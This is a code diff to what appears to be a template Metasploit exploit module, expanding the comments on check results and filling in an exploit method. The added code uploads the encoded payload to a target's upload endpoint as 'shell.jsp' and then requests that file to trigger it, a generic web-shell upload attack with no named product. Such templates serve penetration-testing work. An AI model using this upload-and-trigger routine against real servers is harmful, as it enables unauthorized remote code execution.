@@ -200,12 +200,14 @@ class MetasploitModule < Msf::Exploit::Remote
 
   def check
     # Return CheckCode values:
-    #   CheckCode::Safe        - definitely not vulnerable
-    #   CheckCode::Detected    - service detected, vuln status unknown
-    #   CheckCode::Appears     - likely vulnerable (version-based)
-    #   CheckCode::Vulnerable  - confirmed vulnerable (tested)
+    #   CheckCode::Safe          - definitely not vulnerable
+    #   CheckCode::Detected      - service detected, vuln status unknown
+    #   CheckCode::Appears       - likely vulnerable (version-based)
+    #   CheckCode::Vulnerable    - confirmed vulnerable (tested)
+    #   CheckCode::Unknown       - cannot determine
+    # Accepts optional reason: CheckCode::Appears('Version 1.0 detected')
     res = send_request_cgi('uri' => normalize_uri(target_uri.path))
-    return CheckCode::Unknown unless res
+    return CheckCode::Unknown('Connection failed') unless res
 
     if res.body.include?('VulnerableVersion')
       CheckCode::Appears
@@ -215,7 +217,33 @@ class MetasploitModule < Msf::Exploit::Remote
   end
 
   def exploit
-    # authenticate, upload, trigger payload
+    # 1. Authenticate or prepare
+    print_status('Uploading payload...')
+
+    # 2. Upload/inject payload
+    res = send_request_cgi(
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'upload'),
+      'vars_form_data' => [
+        {
+          'name' => 'file',
+          'filename' => 'shell.jsp',
+          'content_type' => 'application/octet-stream',
+          'data' => payload.encoded,
+          'encoding' => 'binary'
+        }
+      ]
+    )
+
+    fail_with(Failure::Unreachable, 'Connection failed') unless res
+    fail_with(Failure::UnexpectedReply, "Upload failed: #{res.code}") unless res.code == 200
+
+    # 3. Trigger the payload
+    print_status('Triggering payload...')
+    send_request_cgi(
+      'uri' => normalize_uri(target_uri.path, 'shell.jsp'),
+      'method' => 'GET'
+    )
   end
 end
 ```
